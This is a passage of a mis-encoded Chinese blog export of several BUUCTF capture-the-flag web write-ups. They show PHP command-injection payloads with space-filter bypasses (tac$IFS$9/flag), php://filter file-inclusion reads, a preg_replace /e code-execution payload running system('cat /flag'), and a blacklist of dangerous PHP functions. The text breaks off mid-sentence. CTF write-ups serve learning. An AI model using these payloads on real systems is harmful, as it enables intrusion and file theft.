å…³äºintval()å‡½æ•°ï¼šç›´åˆ°é‡ä¸Šæ•°å­—æˆ–æ­£è´Ÿç¬¦å·æ‰å¼€å§‹åšè½¬æ¢ï¼Œåœ¨é‡åˆ°éæ•°å­—æˆ–å­—ç¬¦ä¸²ç»“æŸæ—¶()ç»“æŸè½¬æ¢ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“intvalçš„å‚æ•°å«eä¸”æ²¡åŠ å•å¼•å·ä¸ºç§‘å­¦è®¡æ•°æ³•æ•°å€¼æ—¶ï¼ŒåŠ äº†å•å¼•å·åˆ™è¢«è§†ä¸ºæ˜¯å­—ç¬¦ï¼Œæ ¹æ®intval()å‡½æ•°çš„ç‰¹æ€§å°±ä¼šç»“æŸè½¬æ¢ã€‚æˆ‘ä»¬æ³¨æ„åˆ°æˆ‘ä»¬è¿™é‡ŒGETçš„å˜é‡æ˜¯æœ‰å•å¼•å·åŒ…æ‹¬ï¼Œå› æ­¤æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹&#39;1e4&#39;+1çš„å€¼æ˜¯2è¿˜æ˜¯10001ï¼Œä½†æ˜¯ä¸ç®¡åœ¨æœ¬åœ°æ€ä¹ˆè°ƒè¯•éƒ½æ˜¯ä¸‹é¢è¿™ä¸ªç»“æœï¼š ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼ŸæŸ¥é˜…äº†ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ åŸæ¥æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œæµ‹è¯•åå‘ç°&#39;num&#39;+1ä¼šå¼ºè¡Œè½¬åŒ–ä¸ºæ•´æ•°å‹ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡ç¬¬ä¸€ä¸ªifè¯­å¥äº† payloadï¼š?num=1e4 æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªMD5ç¼–ç åå¼±ç­‰äºå®ƒæœ¬èº«çš„å­—ç¬¦ä¸²ï¼Œä¸Šç½‘æŸ¥æ‰¾ï¼š0e215962017ç¬¦åˆè¦æ±‚ payloadï¼š?md5=0e215962017 è™½ç„¶ç¦ç”¨äº†catå‘½ä»¤ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨tacå‘½ä»¤æ›¿ä»£æˆ–è€…ca\\tç»•è¿‡ï¼›ç”±äºè¿‡æ»¤äº†ç©ºæ ¼ç¬¦ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨$IFS$9ä»£æ›¿ payloadï¼š?get_flag=tac$IFS$9/flag è¿˜æœ‰ä¸€äº›åˆ«çš„ç©ºæ ¼ç»•è¿‡åˆ©ç”¨ï¼š %09(éœ€è¦phpç¯å¢ƒ) $&#123;IFS&#125; $IFS$9 æ•´åˆpayloadï¼š/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$9/flag; ä½†æ˜¯æˆ‘ä»¬è¿™è¾¹æ²¡æœ‰å¾—åˆ°flagï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹ç›®å½•ï¼š/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=ls; flagå¯èƒ½åœ¨è¿™é‡Œé¢ ä¿®æ”¹payloadï¼š/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag; å‚è€ƒèµ„æ–™ï¼šhttps://www.php.net/manual/zh/function.intval.php https://blog.csdn.net/weixin_39813200/article/details/116073792 https://www.cnblogs.com/llllll7/p/14847528.html https://www.cnblogs.com/wrnan/p/12658842.html","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf15","date":"2021-07-25T08:55:25.000Z","path":"2021/07/25/buuctf15/","text":"[BSidesCF 2020]Had a bad dayæ‰“å¼€å®¹å™¨ ä¸€.åˆæ­¥æ¢ç´¢å‘ç°æœ‰ä¸¤ä¸ªæŒ‰é’® å…ˆæŸ¥çœ‹æºç ï¼Œæ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ï¼Œç‚¹å‡»WOOFERSè¿”å›ä¸€å¼ ç‹—çš„å›¾ç‰‡ ç‚¹å‡»MEOWERSè¿”å›ä¸€å¼ çŒ«çš„å›¾ç‰‡ã€‚ä¸¤ä¸ªé¡µé¢æŸ¥çœ‹äº†æºç éƒ½æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ï¼Œä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°URLæ æœ‰å‚æ•°ä¼ é€’ï¼Œè¯•è¯•æ”¹æˆwoofers&#39; æˆ‘ä»¬çœ‹åˆ°æœåŠ¡å™¨åå°ç”¨include()å‡½æ•°åŒ…å«woofersæ–‡ä»¶ï¼ŒåŒæ—¶ä»–å¸®æˆ‘ä»¬æ‹¼æ¥äº†æ–‡ä»¶åç¼€ã€‚ æˆ‘ä»¬å…ˆè¯•è¯•çœ‹woofersæ–‡ä»¶åŒçº§ç›®å½•ä¸‹æœ‰æ²¡æœ‰å­˜åœ¨flagæ–‡ä»¶ï¼š payloadï¼šwoofers/../flag é¡µé¢æ²¡æœ‰å›æ˜¾ï¼Œä½†æ˜¯æŸ¥çœ‹æºç å‘ç°ä¸€ä¸²hintã€‚ å› ä¸ºå­˜åœ¨include()å‡½æ•°ï¼Œæˆ‘ä»¬å°±æƒ³åˆ°php://filteræ–‡ä»¶è¯»å–æµè¯»å–æ–‡ä»¶ï¼š payloadï¼šphp://filter/convert.base64-encode/resource=index å›æ˜¾ä¸€ä¸²base64ç¼–ç å­—ç¬¦ä¸²ï¼Œè§£ç å¾—ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;Images that spark joy&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt; &lt;title&gt;Had a bad day?&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;material.min.css&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;style.css&quot;&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div class&#x3D;&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt; &lt;header class&#x3D;&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt; &lt;div class&#x3D;&quot;mdl-layout__header-row&quot;&gt; &lt;span class&#x3D;&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;&#x2F;span&gt; &lt;div class&#x3D;&quot;mdl-layout-spacer&quot;&gt;&lt;&#x2F;div&gt; &lt;div&gt; &lt;&#x2F;header&gt; &lt;div class&#x3D;&quot;page-ribbon&quot;&gt;&lt;&#x2F;div&gt; &lt;main class&#x3D;&quot;page-main mdl-layout__content&quot;&gt; &lt;div class&#x3D;&quot;page-container mdl-grid&quot;&gt; &lt;div class&#x3D;&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt; &lt;div class&#x3D;&quot;page-crumbs mdl-color-text--grey-500&quot;&gt; &lt;&#x2F;div&gt; &lt;h3&gt;Cheer up!&lt;&#x2F;h3&gt; &lt;p&gt; Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up! &lt;&#x2F;p&gt; &lt;div class&#x3D;&quot;page-include&quot;&gt; &lt;?php $file &#x3D; $_GET[&#39;category&#39;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#39;.php&#39;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125; ?&gt; &lt;&#x2F;div&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;get&quot; id&#x3D;&quot;choice&quot;&gt; &lt;center&gt;&lt;button onclick&#x3D;&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name&#x3D;&quot;category&quot; value&#x3D;&quot;woofers&quot; class&#x3D;&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded&#x3D;&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class&#x3D;&quot;mdl-button__ripple-container&quot;&gt;&lt;span class&#x3D;&quot;mdl-ripple is-animating&quot; style&#x3D;&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;button&gt; &lt;button onclick&#x3D;&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name&#x3D;&quot;category&quot; value&#x3D;&quot;meowers&quot; class&#x3D;&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded&#x3D;&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class&#x3D;&quot;mdl-button__ripple-container&quot;&gt;&lt;span class&#x3D;&quot;mdl-ripple is-animating&quot; style&#x3D;&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;button&gt;&lt;&#x2F;center&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;main&gt; &lt;&#x2F;div&gt; &lt;script src&#x3D;&quot;js&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; äºŒ.æ€è·¯æ„å»ºæ ¸å¿ƒä»£ç å—ï¼š 1234567891011121314&lt;?php $file = $_GET[&#x27;category&#x27;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#x27;.php&#x27;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125; ?&gt; æˆ‘ä»¬çœ‹åˆ°ä»–è¦æ±‚æˆ‘ä»¬ä¸Šä¼ çš„å‚æ•°ä¸­å¿…é¡»åŒ…å«woofersæˆ–meowersæˆ–indexï¼Œphp://filterå¯ä»¥åµŒå¥—ä¸€å±‚åè®® payloadï¼šphp://filter/convert.base64-encode/woofers/resource=flagï¼Œè¿™æ ·æˆ‘ä»¬å°±ç»•è¿‡äº†ifè¯­å¥åˆ¤æ–­ å¯¹å›æ˜¾çš„å­—ç¬¦ä¸²base64è§£ç å¾—flag [ASIS 2019]Unicorn shopæ‰“å¼€å®¹å™¨ åº”è¯¥æ˜¯å«æˆ‘ä»¬è´­ä¹°ç‹¬è§’å…½ ä¸€.åˆæ­¥æ¢ç´¢è¾“å…¥Item IDå’ŒPriceï¼Œä½†æ˜¯ä¸ç®¡æˆ‘ä»¬è¾“å…¥Item ID1-3ä¸­å“ªä¸€ç»„å›æ˜¾éƒ½æ˜¯æ“ä½œå¤±è´¥ï¼š è¾“å…¥Item ID=4å’Œprice=1337æ—¶ï¼Œå›æ˜¾ï¼š ä¹Ÿå°±æ˜¯è¯´priceåªå…è®¸ä¸Šä¼ ä¸€ä¸ªå­—ç¬¦ï¼Œçœ‹æ¥æ˜¯åšäº†é™åˆ¶ã€‚ç½‘é¡µä¸Šæ²¡ä»€ä¹ˆä¿¡æ¯äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°hintæç¤ºè¯´utf-8å¾ˆé‡è¦ã€‚å› ä¸ºä¼ å…¥UTF-8ç¼–ç ï¼Œåœ¨åç«¯å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°è¯¥UTF-8ç¼–ç æ— æ³•è§£æä¸ºASCIIç æ—¶ï¼Œä¼šå°†å…¶è§£æä¸ºUnicodeç¼–ç ã€‚ äºŒ.æ€è·¯æ„å»ºè¿™é¢˜æˆ‘ä»¬çš„æ€è·¯åº”è¯¥å°±æ˜¯åˆ©ç”¨utf-8ç¼–ç å’Œunicodeç¼–ç çš„è½¬æ¢ï¼Œå’ŒUnicodeç¼–ç å®‰å…¨é—®é¢˜ã€‚ é‚£ä¹ˆæˆ‘ä»¬è¦å…ˆæ‰¾åˆ°ä¸€ä¸ªå¯¹åº”é˜¿æ‹‰ä¼¯æ•°å€¼å¤§äº1337çš„å­—ç¬¦ï¼›å¯ä»¥åœ¨è¿™ä¸Šé¢æ‰¾ï¼šhttps://www.compart.com/en/unicode/U+2187 æœç´¢thousandï¼š æˆ‘é€‰æ‹©è¿™ä¸ªå­—ç¬¦ï¼Œä»£è¡¨é˜¿æ‹‰ä¼¯æ•°å­—ä¸€ä¸‡ï¼š ç„¶åæŠŠä»–çš„utf-8ç¼–ç æ”¹æˆå¯¹åº”çš„Unicodeç¼–ç ï¼š%E2%86%82 å‚è€ƒèµ„æ–™ï¼šhttps://blog.csdn.net/weixin_44377940/article/details/106800704 https://xz.aliyun.com/t/5402#toc-0","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf14","date":"2021-07-24T03:50:03.000Z","path":"2021/07/24/buuctf14/","text":"[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤æ‰“å¼€å®¹å™¨ ä¸€.åˆæ­¥æ¢ç´¢å‘ç°ç½‘é¡µæ˜¾ç¤ºä¸€æ®µä»£ç ï¼š 123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; ä»£ç å®¡è®¡ï¼šä¸Šä¼ ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªifè¯­å¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ–‡ä»¶åtextçš„æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æ˜¯å¦ä¸ºI have a dreamï¼Œè¿™é‡Œå¯ä»¥ç”¨data://ä¼ªåè®®ç»•è¿‡ï¼›ç¬¬äºŒä¸ªifè¯­å¥åˆ¤æ–­ä¸Šä¼ çš„$fileå‚æ•°ä¸­æ˜¯å¦å«flagï¼Œä¸å«åˆ™æ‰§è¡Œinclude($file)ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨filter://ä¼ªåè®®è¯»å–æ–‡ä»¶ä¿¡æ¯ã€‚ä¸€å¼€å§‹æˆ‘æ˜¯æƒ³é€šè¿‡fla/g.phpç»•è¿‡æ­£åˆ™åŒ¹é…ç›´æ¥è·å–flagï¼Œä½†æ˜¯ä»–æ²¡æœ‰å›æ˜¾è¯´æ˜ç»•è¿‡äº†ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ï¼Œå› æ­¤è¿˜æ˜¯ä¹–ä¹–çš„å…ˆè¯»å–next.phpæ–‡ä»¶ã€‚ æ„é€ payloadï¼š?text=data:text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php å›æ˜¾ä¸€ä¸²base64ç¼–ç å­—ç¬¦ä¸²ï¼Œè§£ç å¾—ï¼š 1234567891011121314151617181920&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123; return preg_replace( &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, $str );&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123; @eval($_GET[&#x27;cmd&#x27;]);&#125; ä»£ç å®¡è®¡ï¼š è¿™é‡Œå®šä¹‰ä¸¤ä¸ªå‡½æ•°ï¼š complex()å‡½æ•°ï¼šè°ƒç”¨preg_replaceå‡½æ•° preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) åŠŸèƒ½ï¼šæœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacement è¿›è¡Œæ›¿æ¢ã€‚ å‚æ•°è¯´æ˜ï¼š $pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚ $replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚ $subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚ $limit: å¯é€‰ï¼Œå¯¹äºæ¯ä¸ªæ¨¡å¼ç”¨äºæ¯ä¸ª subject å­—ç¬¦ä¸²çš„æœ€å¤§å¯æ›¿æ¢æ¬¡æ•°ã€‚ é»˜è®¤æ˜¯-1ï¼ˆæ— é™åˆ¶ï¼‰ã€‚ $count: å¯é€‰ï¼Œä¸ºæ›¿æ¢æ‰§è¡Œçš„æ¬¡æ•°ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„preg_replace ä½¿ç”¨äº† /e æ¨¡å¼ï¼Œå¯¼è‡´å¯ä»¥ä»£ç æ‰§è¡Œâ€”â€”preg_replace å‡½æ•°åœ¨åŒ¹é…åˆ°ç¬¦å·æ­£åˆ™çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šå°†æ›¿æ¢å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯ preg_replace å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰å½“åšä»£ç æ¥æ‰§è¡Œã€‚ä½†æ˜¯è¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°ä¸æ˜¯å›ºå®šçš„å—â€”â€”strtolower(â€œ\\\\1â€)**ï¼Œè€Œeval(â€˜strtolower(â€œ\\1â€);â€™)** ç»“æœä¸º \\\\1 å®é™…ä¸Šå°±æ˜¯ \\1ã€‚ getFlag()å‡½æ•°ï¼šè°ƒç”¨eval()å‡½æ•°ï¼Œæ‰§è¡Œæˆ‘ä»¬GETçš„$cmdå‚æ•°å€¼ã€‚ ä»£ç ä¸­è¿˜æœ‰ä¸€ä¸ªé™Œç”Ÿå‡½æ•°ï¼šforeach()å‡½æ•° foreach è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼ã€‚foreach ä»…èƒ½å¤Ÿåº”ç”¨äºæ•°ç»„å’Œå¯¹è±¡ï¼Œå¦‚æœå°è¯•åº”ç”¨äºå…¶ä»–æ•°æ®ç±»å‹çš„å˜é‡ï¼Œæˆ–è€…æœªåˆå§‹åŒ–çš„å˜é‡å°†å‘å‡ºé”™è¯¯ä¿¡æ¯ã€‚æœ‰ä¸¤ç§è¯­æ³•ï¼š foreach (iterable_expression as $value) foreach (iterable_expression as $key =&gt; $value) ç¬¬ä¸€ç§æ ¼å¼éå†ç»™å®šçš„ iterable_expression è¿­ä»£å™¨ã€‚æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå½“å‰å•å…ƒçš„å€¼è¢«èµ‹ç»™ $valueã€‚ ç¬¬äºŒç§æ ¼å¼åšåŒæ ·çš„äº‹ï¼Œåªé™¤äº†å½“å‰å•å…ƒçš„é”®åä¹Ÿä¼šåœ¨æ¯æ¬¡å¾ªç¯ä¸­è¢«èµ‹ç»™å˜é‡ $keyã€‚ äºŒ.æ€è·¯æ„å»ºè¦æ€ä¹ˆåˆ©ç”¨ preg_replace /e æ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œè¿™ä¸€ç‰¹æ€§å‘¢ï¼ŸæŸ¥çœ‹èµ„æ–™ï¼ŒåŸæ¥å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å· å°†å¯¼è‡´ç›¸åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ &#39;\\n&#39; è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚ å› æ­¤è¿™é‡Œçš„\\1æŒ‡çš„æ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æ„é€ payloadæ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ä¸ºgetFlag()å‡½æ•°ï¼› åˆ©ç”¨foreach()å‡½æ•°çš„ç‰¹æ€§ä¸Šä¼ ?\\S*=getFlag()ï¼Œä½†æ˜¯è¿™æ ·æ˜¯è°ƒç”¨ä¸äº†getFlag()å‡½æ•°çš„ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿåœ¨phpä¸­ï¼ŒåŒå¼•å·é‡Œé¢å¦‚æœåŒ…å«æœ‰å˜é‡ï¼Œphpè§£é‡Šå™¨ä¼šè¿›è¡Œè§£æï¼›å•å¼•å·ä¸­çš„å˜é‡ä¸ä¼šè¢«å¤„ç†ã€‚ è€Œè¿™é‡Œçš„strtolower(â€œ\\\\1â€)ï¼Œé‡Œé¢æ˜¯åŒå¼•å·ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¸Šä¼ ä¸€ä¸ªå˜é‡ã€‚ å› æ­¤æ”¹ç‰ˆåçš„payloadä¸ºï¼šnext.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;); å‚è€ƒèµ„æ–™ï¼šhttps://www.php.net/manual/zh/language.variables.variable.php https://blog.csdn.net/qq_43622442/article/details/106018883 https://xz.aliyun.com/t/2557 https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf13","date":"2021-07-23T02:26:27.000Z","path":"2021/07/23/buuctf13/","text":"æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ç½‘é¡µæ¯éš”å‡ ç§’å°±ä¼šåˆ·æ–°ä¸€æ¬¡ ä¸€.åˆæœŸæ¢ç´¢æŸ¥çœ‹ç½‘é¡µæºç ï¼Œæ²¡ä»€ä¹ˆçº¿ç´¢ï¼ŒæŠ“åŒ…è¯•è¯• æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªdateåº”è¯¥æ˜¯ä¸ªå‡½æ•°åï¼Œè¿”å›ç»™æˆ‘ä»¬æ—¶é—´ç„¶åpçš„å€¼æ˜¯date()å‡½æ•°çš„å‚æ•°ï¼Œå› æ­¤è¿™ä¸ªå¯èƒ½åˆ©ç”¨äº†call_user_func()å‡½æ•°ï¼šcall_user_func(å‡½æ•°åï¼Œå‚æ•°)ï¼šè°ƒç”¨ä¼ é€’å‡½æ•°ï¼Œå¹¶è¿”å›å‡½æ•°è¿è¡Œçš„ç»“æœï¼ˆæœ¬é¢˜ä¸­å³ä¸ºæ‰§è¡Œ$func($p)ï¼‰ é‚£ä¹ˆæˆ‘ä»¬å°±ä»¥è¯•è¯•ç”¨file_get_contents()å‡½æ•°è¯»å–æ–‡ä»¶ï¼Œè¯•è¯•èƒ½ä¸èƒ½ç›´æ¥è¯»å–flagæ–‡ä»¶ï¼Œä¸€èˆ¬flagéƒ½åœ¨æ ¹ç›®å½•ä¸‹å°è¯• æ²¡æ‰¾åˆ°ï¼Œè¯•äº†å‡ æ¬¡è·¯å¾„ä¹Ÿä¸è¡Œï¼Œçœ‹æ¥å¿ƒæ€¥äº†ï¼Œè¯»å–index.phpè¯•è¯•ï¼š 123456789101112131415161718192021222324252627282930313233 &lt;?php&#x2F;&#x2F;å®šä¹‰æ®µä»£ç  $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result &#x3D; call_user_func($func, $p); $a&#x3D; gettype($result); if ($a &#x3D;&#x3D; &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p &#x3D; &quot;Y-m-d h:i:s a&quot;; var $func &#x3D; &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func !&#x3D; &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; &#x2F;&#x2F;æ‰§è¡Œä»£ç æ®µ $func &#x3D; $_REQUEST[&quot;func&quot;]; $p &#x3D; $_REQUEST[&quot;p&quot;]; if ($func !&#x3D; null) &#123; $func &#x3D; strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; äºŒ.ä»£ç å®¡è®¡æˆ‘ä»¬çœ‹åˆ°å®ƒè®¾ç«‹äº†ä¸€ä¸ªé»‘åå•ï¼Œç¦äº†å¾ˆå¤šå‘½ä»¤ï¼›å®šä¹‰äº†gettime()å‡½æ•°â€”â€”è°ƒç”¨call_user_func()å‡½æ•°ï¼Œå¹¶è¿”å›å­—ç¬¦ä¸²å†…å®¹ï¼›å®šä¹‰äº†Textç±»ï¼›åŒæ—¶ä¸Šä¼ ä¸¤ä¸ªå‚æ•°ï¼Œifè¯­å¥åˆ¤æ–­ä¸Šä¼ çš„ $funcä¸­æ˜¯å¦å­˜åœ¨é»‘åå•ä¸­çš„å‘½ä»¤ï¼Œä¸å­˜åœ¨åˆ™è¾“å‡ºè°ƒç”¨gettime()å‡½æ•°ã€‚ ä¸‰.æ€è·¯æ„å»ºæˆ‘ä»¬çœ‹åˆ°å®ƒå®šä¹‰äº†ä¸€ä¸ªç±»ï¼Œä½†æ˜¯å®ƒæœ¬èº«å¹¶æ²¡æœ‰åˆ©ç”¨è¿™ä¸ªç±»ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œç»•è¿‡$funcçš„é»‘åå•æ£€æµ‹ã€‚ payloadï¼š$func=unserialize,$p=åºåˆ—åŒ–å­—ç¬¦ä¸² é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªååºåˆ—åŒ–å‘¢ï¼Ÿæˆ‘ä»¬çœ‹åˆ°å®ƒååºåˆ—åŒ–çš„è¿‡ç¨‹ä¼šæ 